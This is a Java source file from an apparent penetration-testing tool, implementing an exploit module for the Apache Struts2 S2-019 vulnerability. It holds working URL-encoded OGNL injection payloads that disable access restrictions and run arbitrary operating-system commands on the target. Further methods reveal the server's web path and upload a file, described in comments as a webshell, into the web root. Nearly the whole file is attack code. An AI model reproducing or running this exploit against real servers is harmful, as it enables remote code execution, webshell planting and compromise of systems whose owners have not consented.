package fun.fireline.exp.apache.struts2;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTool;

import java.net.URLEncoder;
import java.util.UUID;

/**
 * @author yhy
 * @date 2021/8/17 13:57
 * @github https://github.com/yhy0
 */

public class S2_019 implements ExploitInterface {

    private String target = null;
    private boolean isVul = false;

    private String payload = "debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29,%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27payload%27%29%2C%23b%3D%23a.getInputStream%28%29%2C%23dis%3Dnew+java.io.DataInputStream%28%23b%29%2C%23buf%3Dnew+byte%5B20000%5D%2C%23dis.read%28%23buf%29%2C%23dis.close%28%29%2C%23msg%3Dnew+java.lang.String%28%23buf%29%2C%23msg%3D%23msg.trim%28%29";

    private String webPath = "debug=browser&object=(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path))&pp=%2f";
    @Override
    public boolean checkVul(String url) {
        this.target = url;
        String uuid =  UUID.randomUUID().toString();
        try {
            String data = this.payload.replace("payload", "echo " + uuid);
            String result = HttpTool.postHttpReuest(this.target, "application/x-www-form-urlencoded", data, "UTF-8");
            boolean flag = result.contains(uuid);
            if(flag) {
                this.isVul = true;
            }
            return flag;
        } catch (Exception e) {
            logger.error(e);
        }
        return false;
    }

    @Override
    public String exeCmd(String cmd, String encoding) {
        try {
            String data = payload.replace("payload", cmd);
            String result = HttpTool.postHttpReuest(this.target, "application/x-www-form-urlencoded", data, encoding);
            return result;

        } catch (Exception e) {
            logger.error(e);
        }
        return "fail";
    }

    @Override
    public String getWebPath() {
        try {
            String result = HttpTool.postHttpReuest(this.target, "application/x-www-form-urlencoded", webPath, "UTF-8");
            return result;

        } catch (Exception e) {
            logger.error(e);
        }
        return "命令执行失败";
    }

    @Override
    public String uploadFile(String fileContent, String filename, String platform) throws Exception {

        // 这个payload注意，上传的代码中存在 java.lang.String 接受 shell 内容， 上传的shell马中存在 " , 所以需要转义一下
        fileContent = URLEncoder.encode(fileContent, "UTF-8" ).replace("%22", "%5C%22");

        String payload = "debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29,%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest%28%29%2C%23resp%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29%2C%23path%3D%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%22%2F%22%29%2C%23content%3Dnew+java.lang.String%28%22SHELLContent%22%29%2C%23file%3Dnew+java.io.File%28%23path+%2B%22%2FSHELLPATH%22%29%2C%23fos%3Dnew+java.io.FileOutputStream%28%23file%29%2C%23fos.write%28%23content.getBytes%28%29%29%2C%23fos.flush%28%29%2C%23fos.close%28%29%2C%23resp.getWriter%28%29.println%28%22Ok0Kok%22%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29";
        payload = payload.replace("SHELLPATH", filename).replace("SHELLContent", fileContent);

        String result = HttpTool.postHttpReuest(this.target, "application/x-www-form-urlencoded", payload, "UTF-8");

        if(result.contains("Ok0Kok")) {
            result = result + "  上传成功! ";
        } else {
            result =  "上传失败";
        }

        return result;

    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
